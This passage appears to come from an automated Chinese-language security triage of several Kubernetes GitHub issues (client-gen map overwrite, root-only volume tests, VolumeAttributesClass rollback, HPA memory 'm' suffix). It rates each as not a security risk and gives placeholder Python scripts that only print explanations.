        # 注意：Python 线程通常不容易被强制停止，这里仅示意
        exit_event.set() # 可以用于通知子线程（如果子线程检查此事件）

# 直接执行主逻辑（根据要求，不使用 if __name__ == "__main__":）
run_main_with_timeout()
```


**解释说明：**

上述 Python 脚本并非直接运行 `client-gen` 或与其交互，而是模拟了 Issue 中指出的 Go 代码 (`GroupVersionPackages` 函数) 的核心逻辑缺陷。

1.  **`GroupVersion` 类**: 模拟 Go 代码中的 `types.GroupVersion` 结构。为了能在 Python 字典中作为 key 使用，它实现了 `__hash__` 和 `__eq__` 方法，确保具有相同 `group` 和 `version` 属性的对象被视为相等且具有相同的哈希值。
2.  **`simulate_group_version_packages` 函数**: 这个函数接受一个类似 `client-gen` 输入参数的结构 (`groups_config`)。它遍历这个结构，为每个 Group 和 Version 创建一个 `GroupVersion` 对象作为 key，并将对应的包路径 (`Package`) 作为 value 存入一个 Python 字典 (`result_map`)。关键在于，当遇到一个已经存在于字典中的 `GroupVersion` key 时，Python 字典的行为（与 Go map 类似）是用新的 value 覆盖旧的 value。函数通过打印中间步骤展示了这个覆盖过程。
3.  **`main` 函数**: 设置了一个包含冲突配置的 `mock_input_config`。这个配置定义了两个资源，它们共享相同的 Group (`code-generator.k8s.io`) 和 Version (`v1`)，但来自不同的模拟包路径 (`path/to/example/v1` 和 `path/to/example2/v1`)。还加入了一个不同 Group 的配置以验证非冲突项不受影响。然后调用 `simulate_group_version_packages` 函数处理这个配置，并打印最终的 `result_map`。
4.  **验证**: 检查最终的 `result_map` 是否如预期那样，只包含了 `code-generator.k8s.io/v1` 的最后一个包路径 (`path/to/example2/v1`)，从而证明了覆盖行为的发生。同时验证了非冲突的 `another.group.com/v1` 条目依然存在。
5.  **超时机制**: 使用 `threading` 模块实现了一个简单的超时控制 (`run_main_with_timeout` 函数)，确保脚本在2分钟内完成执行或报告超时。

这个脚本的目的是在 Python 环境中清晰地展示导致 Issue 中所述问题的根本原因——即使用 Group/Version 作为唯一 key 时，相同 key 的后续条目会覆盖先前条目，从而导致信息丢失。它并不实际执行代码生成，因此不构成安全风险，且仅用于理解和演示该逻辑缺陷。由于原始问题是功能性而非安全性的，且发生在开发工具内部，因此风险评级为“不涉及”。

---


## Issue #130624 Remove unit tests in volume_linux.go that needs to be ran as root

- Issue 链接：[#130624](https://github.com/kubernetes/kubernetes/issues/130624)

### Issue 内容

#### What happened?

Now that, we have full e2e coverage of fsgroup feature - we can remove the unit tests that require root permissions to run.

But this needs to be done carefully. Without root permissions, none of the code that exercises `chown` can run and hence unit tests can't verify if ownership of files have changed. But at the same time, removing that guarantee can make some of the unit tests kinda pass even if unit tests themselves are buggy.


#### What did you expect to happen?

volume_linux.go tests shouldn't require root permissions to run.

#### How can we reproduce it (as minimally and precisely as possible)?

Run unit tests

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 的核心内容是建议移除 `volume_linux.go` 文件中需要 root 权限才能运行的单元测试。理由是现在已经有了端到端（e2e）测试覆盖了 `fsgroup` 特性，这些需要 root 的单元测试变得冗余。Issue 还提到了移除这些测试需要小心，因为没有 root 权限，依赖 `chown` 的代码路径将无法在单元测试中直接验证文件所有权变更，需要确保移除测试不会意外地导致潜在的 bug 被忽略。

根据风险判断标准：
1.  该 Issue 讨论的是单元测试的维护和优化问题，目标是移除需要特权权限的测试，以便在普通用户环境下运行测试套件。
2.  它描述的是开发和测试流程中的一个改进点，而不是软件本身在运行时的安全漏洞。单元测试通常在开发或 CI 环境中运行，与生产环境的实际运行逻辑和面临的威胁不同。
3.  Issue 中没有提及任何用户输入、外部交互或配置会导致安全风险（如命令注入、路径遍历、权限提升等）。
4.  移除需要 root 的测试本身是为了降低测试环境的风险和复杂性，而不是引入新的风险。虽然 Issue 提到了移除测试可能带来的验证缺失风险，但这属于测试覆盖度的问题，而非直接的安全漏洞。
5.  根据标准第 2 条，该 issue 描述的问题非安全问题。

因此，该 Issue 不涉及软件本身的安全风险。

**复现过程：**

```python
# Issue 分析结论为“不涉及”安全风险，无需复现脚本。
# 该 Issue 讨论的是代码库中单元测试的维护问题，
# 具体操作是在代码库中移除或修改特定的单元测试函数，
# 这不构成一个可以通过外部交互复现的安全漏洞。
def main():
    print("该 Issue 不涉及安全风险，无需 POC 脚本。")
    print("Issue 内容关注于移除需要 root 权限的单元测试，属于软件开发和测试流程优化。")

main()
```


**解释说明：**

该 Issue 讨论的是 Kubernetes 代码库中 `volume_linux.go` 文件内单元测试的改进建议。具体来说，建议移除那些需要 root 权限才能执行的测试用例，因为相关功能（`fsgroup`）已有端到端测试覆盖。这是一个关于测试策略和代码维护的讨论，目的是让单元测试更容易在没有特殊权限的环境下运行。Issue 本身并未描述软件中存在的、可被利用的安全漏洞。因此，风险评级为“不涉及”，不需要提供复现安全漏洞的 POC 脚本。提供的 python 脚本仅作为占位符，说明了无需 POC 的原因。

---


## Issue #130597 VolumeAttributesClass update should support recover from failure

- Issue 链接：[#130597](https://github.com/kubernetes/kubernetes/issues/130597)

### Issue 内容

#### What happened?

- When setting a VolumeAttributesClass (VAC) name in PVC for the first time, currently there isn't a way for the user to go back to unsetting VAC name even if it keeps failing and there is no way of setting VAC name successfully on the storage backend.
- When changing a VAC name from A->B, currently there isn't a way for the user to go back to VAC A if it keeps failing and there is no way of changing from A->B successfully on the storage backend.

#### What did you expect to happen?

- When setting a VolumeAttributesClass (VAC) name in PVC for the first time, there should be a way for the user to roll back (unset the VAC name) if it keeps failing and if there is no way of setting the VAC name successfully on the storage backend.
- When changing a VAC name from A->B, there should be a way for the user to roll back (change VAC name back to A) if it keeps failing and if there is no way of changing from A->B successfully on the storage backend.

#### How can we reproduce it (as minimally and precisely as possible)?

- Try to set VAC name in PVC for the first time but providing a VAC that is infeasible to set on the storage backend so it will never be successful.
- Try to change a VAC name from A->B but B is an infeasible option for the storage backend so it will never be successful.

#### Anything else we need to know?

If CSI driver returns an error code that indicates CSI ModifyVolume is infeasible, we should allow the user to roll back the VAC change in PVC.

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
</details>
Kubernetes 1.32

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
1.  **问题描述**: Issue 描述了在 Kubernetes 中更新 PersistentVolumeClaim (PVC) 的 `VolumeAttributesClass` (VAC) 时遇到的一个功能性问题。当用户首次设置 VAC 或更改现有 VAC 时，如果后端存储系统 (通过 CSI 驱动) 无法成功应用该 VAC (例如，VAC 无效或不被支持)，用户目前无法撤销或回滚 PVC spec 中的这个更改。PVC 会卡在尝试应用失败状态的 VAC。
2.  **影响**: 这个问题的直接影响是用户可能无法使用或修改受影响的 PVC，因为它处于一个错误的、无法自动恢复的配置状态。这会导致依赖该 PVC 的 Pod 无法正常挂载卷，从而影响应用的可用性。
3.  **安全风险评估**:
    *   **机密性/完整性/可用性**: 该问题主要影响**可用性**。用户自己的 PVC 可能变得不可用。它不涉及未经授权的数据访问 (机密性) 或数据篡改 (完整性)。
    *   **攻击者利用**: 潜在的攻击者需要拥有修改目标 PVC 的权限 (通常是 namespace 内的 `edit` 或更高权限)。攻击者可以通过故意设置一个无效的 VAC 来使某个 PVC 不可用。
    *   **拒绝服务 (DoS)**: 这可以被视为一种针对特定 PVC 的拒绝服务。然而，根据风险判断标准第 5 条，这种 DoS 需要攻击者具备修改 PVC 的权限，这种权限本身就允许对资源进行破坏性操作（例如删除 PVC）。因此，利用此问题进行 DoS 攻击，其前提权限要求较高，且影响范围相对有限（针对特定 PVC）。它并不比拥有该权限的攻击者直接删除 PVC 或相关 Pod 造成的破坏更大。
    *   **权限提升/命令执行/信息泄露**: 该问题不涉及任何权限提升、远程命令执行、容器逃逸或敏感信息泄露。
    *   **多租户影响**: 该问题通常影响的是进行操作的用户自己的 PVC。虽然底层存储可能是共享的，但将一个 PVC 配置为无效 VAC 通常不会直接影响到其他租户/用户的 PVC（除非 CSI 驱动实现有缺陷，但这超出了该 Issue 本身的范畴）。根据风险判断标准第 8 条，没有迹象表明低权限用户可以影响其他用户。
    *   **CVSS 评分**: 如果强行视为一个可用性漏洞，由于需要较高权限（修改 PVC）且影响范围有限（单个 PVC），其 CVSS 评分不太可能达到 `High` (7.0+) 级别。例如，AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:L (大致评分为 2.x - 3.x，属于 Low)。PR:H 是因为需要特定对象修改权限。
4.  **结论**: 该 Issue 描述的是一个功能缺陷和可靠性问题，而非典型的安全漏洞。它可能导致特定资源的可用性降低，但利用条件（需要修改权限）和影响范围有限，不满足高风险安全问题的标准。根据提供的风险判断标准，特别是第 5 条，该问题应被评为 "不涉及" 或 "低风险"。考虑到它本质上是错误配置导致的功能阻塞，而非利用系统弱点获取额外权限或造成广泛破坏，“不涉及” 更为贴切，因为它关注的是系统健壮性而非安全边界。

**复现过程：**

```python
# 该 Issue 被判定为功能性问题而非高风险安全漏洞，因此不提供复现 POC 脚本。
# 问题核心在于 K8s API Server/Controller 层面对于设置失败的 VolumeAttributesClass 缺乏回滚机制，
# 而非可通过简单脚本触发的典型安全漏洞（如 RCE, SQLi, XSS 等）。
# 复现需要一个配置了 CSI 驱动的 Kubernetes 集群，并创建一个模拟失败场景的 VolumeAttributesClass 或 CSI Driver 行为，
# 这超出了通用 POC 脚本的范畴，且不代表高风险安全利用。

print("该 Issue 被判定为功能性问题，风险评级为 '不涉及'，故不生成复现脚本。")
print("复现此问题需要特定的 Kubernetes 环境和 CSI 配置，模拟后端存储无法应用 VAC 的场景。")

def main():
    print("执行完毕。")

main() # 直接调用 main 函数
```


**解释说明：**

该 Issue 指出的问题是 Kubernetes 在处理 PVC 的 `VolumeAttributesClass` 更新失败时缺乏回滚机制，导致 PVC 可能卡在错误状态，影响其可用性。

1.  **风险分析结论**: 经过分析，此问题被定性为功能缺陷或健壮性问题，而非安全漏洞。虽然它可能导致特定 PVC 的拒绝服务，但需要用户拥有修改该 PVC 的权限，影响范围有限，并且不涉及权限提升、信息泄露或跨租户攻击等高风险场景。因此，根据风险判断标准，其风险评级为“不涉及”。
2.  **POC 脚本**: 由于该问题不属于高风险安全漏洞，按照要求，无需提供复现 POC 脚本。提供的 Python 代码仅包含一条说明信息，表明由于风险评级的原因未生成脚本，并解释了复现该问题需要特定的环境配置。代码中的 `main()` 函数被直接调用，以符合不使用 `if __name__ == "__main__":` 的要求。

---


## Issue #130584 Incorrect m Suffix in Memory Values for kubectl get hpa

- Issue 链接：[#130584](https://github.com/kubernetes/kubernetes/issues/130584)

### Issue 内容

#### What happened?

kubectl get hpa incorrectly appends m (millicores) to memory usage values. Memory should always be displayed in bytes, MiB, or GiB, never in "millibytes (m)". This issue also exists in the autoscaling/v2 API, suggesting a deeper problem beyond kubectl

 Affected Versions
Kubernetes Version: v1.29+
kubectl Version: v1.29+
Metrics Server: latest stable
Environment: Affects both on-prem and cloud-managed Kubernetes (e.g., AKS, EKS, GKE).

Deploy an HPA that scales based on memory usage:

yaml

apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: test-hpa
  namespace: default
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: test-deployment
  minReplicas: 1
  maxReplicas: 10
  metrics:
    - type: Resource
      resource:
        name: memory
        target:
          type: AverageValue
          averageValue: 325Mi
Apply the configuration:

sh

kubectl apply -f test-hpa.yaml
Check HPA details:

sh

kubectl get hpa test-hpa -n default
Observed Output:

bash

NAME      REFERENCE        TARGETS      MINPODS   MAXPODS   REPLICAS   AGE
test-hpa  Deployment/test  171502796800m/325Mi   1         10        2          10m
Problem: The value 171502796800m should not have m, as memory is measured in bytes.

Fetch raw API data:

kubectl get --raw "/apis/autoscaling/v2/namespaces/default/horizontalpodautoscalers/test-hpa" | jq
API Output (Incorrect format):

json
{
  "status": {
    "currentMetrics": [
      {
        "type": "Resource",
        "resource": {
          "name": "memory",
          "current": {
            "averageValue": "**172043468800m**"
          }
        }
      }
    ]
  }
}
🚨 Incorrect: The API also appends m, suggesting the issue is deeper than kubectl.


#### What did you expect to happen?

Expected Behavior **Actual Behavior ( kubectl get hpa )
Memory should be displayed in MiB, GiB, or raw
bytes
Memory is displayed with an incorrect m suffix
Example: 171502796800 bytes = 163,599 MiB Shown incorrectly as 171502796800m
Consistent with Kubernetes documentation Misleading as "millibytes" (which is not a Kubernetes
unit)

#### How can we reproduce it (as minimally and precisely as possible)?

refer

#### Anything else we need to know?

_No response_

#### Kubernetes version

 kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.29.10
WARNING: version difference between client (1.31) and server (1.29) exceeds the supported minor version skew of +/-1


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了`kubectl get hpa`命令以及`autoscaling/v2` API在展示基于内存的HPA（Horizontal Pod Autoscaler）状态时，将内存的当前平均值（`current.averageValue`）错误地附加了`m`（通常用于表示CPU的millicores）后缀的问题。内存的单位应该是字节或者MiB/GiB等标准单位，而不应该是带有`m`后缀的值（例如 `171502796800m`）。

问题分析：
1.  **问题性质**：这是一个数据显示格式错误的问题。API和kubectl错误地将内存值格式化为带有`m`后缀的字符串。
2.  **影响范围**：影响用户通过`kubectl`或直接查询API获取HPA状态时对内存使用情况的可读性和理解。依赖于此输出进行监控或自动化的脚本可能会因为预期外的格式而出错或解析错误。
3.  **潜在风险**：
    *   **用户混淆**：用户可能误解内存使用量，例如将其误认为是"millibytes"（一个不存在的标准单位）或者与CPU混淆。
    *   **自动化脚本错误**：解析`kubectl get hpa`或API响应的脚本如果期望的是标准内存单位（如bytes, Ki, Mi, Gi）或者纯数字，遇到非预期的`m`后缀可能会失败或产生错误计算。
    *   **安全风险**：该问题本身是一个显示错误/数据表示错误。它不涉及：
        *   **信息泄露**：没有泄露额外的敏感信息。显示的内存值本身是预期的监控数据。
        *   **权限提升**：无法利用此错误提升权限。
        *   **命令执行**：无法利用此错误执行命令。
        *   **拒绝服务 (DoS)**：虽然错误的格式可能导致解析脚本失败，但这通常属于功能性问题，难以构成对核心服务的DoS攻击。攻击者无法通过触发此显示错误来耗尽资源或使服务不可用。HPA的实际扩缩容决策逻辑很可能基于内部的原始数值（字节数），而非这个格式化后的字符串，因此核心功能不受影响。
        *   **数据篡改**：错误在于显示，而非底层数据的存储或HPA的决策逻辑。

结论：该Issue描述的是一个功能性Bug，具体来说是API和客户端工具在展示内存指标时的数据格式化错误。它会导致用户混淆和潜在的自动化脚本解析问题，但不构成可利用的安全漏洞。根据风险判断标准，这不属于安全问题。

**复现过程：**

```python
# 本 Issue 描述的问题非安全风险，因此不提供复现POC脚本。
# 该问题是一个显示格式错误，可以通过部署一个基于内存的HPA并使用kubectl或API查询其状态来观察。
# 复现步骤已在Issue内容中提供，主要是部署资源和执行查询命令。
# 由于风险评级为“不涉及”，根据要求无需生成POC。

print("该Issue描述的问题是一个显示格式错误，并非安全漏洞，风险评级为'不涉及'，因此不生成复现POC。")
print("可以通过Issue中描述的步骤手动复现该显示问题：")
print("1. 创建一个Deployment。")
print("2. 创建一个基于内存使用率的HorizontalPodAutoscaler。")
print("3. 使用 'kubectl get hpa <hpa-name>' 或直接查询 'autoscaling/v2' API观察内存指标的显示格式。")
```


**解释说明：**

上述Issue描述了一个在Kubernetes v1.29+版本中，`kubectl get hpa`命令和`autoscaling/v2` API在显示基于内存的水平 Pod 自动伸缩器（HPA）状态时，错误地给内存使用值附加了`m`后缀的问题。例如，内存使用量被显示为`171502796800m`，而预期的格式应该是字节数（如 `171502796800`）或标准的二进制前缀单位（如 `163599Mi`）。

此问题被定性为**功能性缺陷/显示错误**，而非安全漏洞。原因如下：
1.  **无直接安全影响**：该错误仅影响数据的展示方式，并未导致信息泄露、权限提升、远程代码执行、拒绝服务或数据篡改等安全风险。HPA的核心伸缩逻辑很可能依赖于未格式化的原始内存数值（以字节为单位），因此集群的自动伸缩功能本身预计不会受到影响。
2.  **非可利用漏洞**：攻击者无法利用这个显示错误来攻击系统或获取未授权的访问。它主要是给用户和依赖输出格式的自动化工具带来了困扰和潜在的解析错误。

根据风险判断标准，由于该问题不属于安全漏洞范畴，其风险评级为“不涉及”。因此，不需要提供用于复现安全风险的POC脚本。提供的“脚本”内容仅用于说明情况并指出无需生成POC。用户可以通过Issue中提供的`kubectl`命令和YAML配置在相应版本的Kubernetes集群中手动复现这个显示问题。

---


